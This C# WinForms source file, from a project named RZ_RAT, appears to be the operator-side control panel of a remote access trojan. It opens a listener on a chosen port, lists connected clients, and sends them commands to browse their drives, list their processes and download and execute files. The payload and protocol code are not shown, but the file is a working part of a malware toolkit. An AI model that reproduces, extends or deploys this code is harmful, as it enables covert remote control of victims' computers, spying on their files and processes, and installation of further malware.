using Microsoft.VisualBasic;
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace RZ_RAT
{
    public partial class Form1 : Form
    {
        public static Server ServerObject = null;
        public Form1()
        {
            InitializeComponent();
        }
   
        private void Form1_Load(object sender, EventArgs e)
        {
            DirectoryInfo dir = new DirectoryInfo(Directory.GetCurrentDirectory() + @"\ico");
            foreach (FileInfo file in dir.GetFiles())
            {
                imageList1.Images.Add(Path.GetFileNameWithoutExtension(file.FullName),Image.FromFile(file.FullName));
            }
            listView1.SmallImageList = imageList1;
            int port = 4562;
            string rr = ShowDialog("Port :", "type port");
            if (!(int.TryParse(rr,out port)))
            {
                port = 4562;
            }
            label1.Text = "Port : " + port;
            ServerObject = new Server(port,this);
            new Thread(()=> { ServerObject.Strat(); }).Start();
        }
        public static string ShowDialog(string text, string caption)
        {
            Form prompt = new Form()
            {
                Width = 500,
                Height = 150,
                FormBorderStyle = FormBorderStyle.FixedDialog,
                Text = caption,
                StartPosition = FormStartPosition.CenterScreen
            };
            Label textLabel = new Label() { Left = 50, Top = 20, Text = text };
            TextBox textBox = new TextBox() { Left = 50, Top = 50, Width = 400 ,Text = "4562" };
            Button confirmation = new Button() { Text = "Ok", Left = 350, Width = 100, Top = 70, DialogResult = DialogResult.OK };
            confirmation.Click += (sender, e) => { prompt.Close(); };
            prompt.Controls.Add(textBox);
            prompt.Controls.Add(confirmation);
            prompt.Controls.Add(textLabel);
            prompt.AcceptButton = confirmation;

            return prompt.ShowDialog() == DialogResult.OK ? textBox.Text : "";
        }
   
        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            System.Environment.Exit(0);
        }

        private void msgboxToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ListView.SelectedListViewItemCollection breakfast = Form1.ServerObject.Context.listView1.SelectedItems;
            foreach (ListViewItem item in breakfast)
            {
                int index_ = (int)item.Tag;
                ServerObject.ClientsObjs[index_].FM = new FileManger(index_);
                ServerObject.ClientsObjs[index_].addCommand("harddrives");
                ServerObject.ClientsObjs[index_].FM.Show();
            }
        }
        private void processListToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ListView.SelectedListViewItemCollection breakfast = Form1.ServerObject.Context.listView1.SelectedItems;
            foreach (ListViewItem item in breakfast)
            {
                int index_ = (int)item.Tag;
                ServerObject.ClientsObjs[index_].PF = new ProcessForm(index_);
                ServerObject.ClientsObjs[index_].addCommand("processlist");
                ServerObject.ClientsObjs[index_].PF.Show();
            }
        } // process get command

        private void downExecToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new Downloader().Show();
        } // download command
        #region about me
        private void label5_MouseHover(object sender, EventArgs e)
        {
            label5.ForeColor = Color.Red;
        }

        private void label5_MouseLeave(object sender, EventArgs e)
        {
            label5.ForeColor = Color.Blue;
        }

        private void label5_Click(object sender, EventArgs e)
        {
            new AboutBox1().ShowDialog();
        }
        #endregion
        private void listView1_SelectedIndexChanged(object sender, EventArgs e)
        {
            try
            {
                label4.Text = "Commands : " + ServerObject.ClientsObjs[(int)listView1.SelectedItems[0].Tag].commands.Count;
            }
            catch { label4.Text = "Commands : 0"; }
        }

        private void label4_Click(object sender, EventArgs e)
        {

        }

        private void listView1_DoubleClick(object sender, EventArgs e)
        {

        }
       
       
    }
}
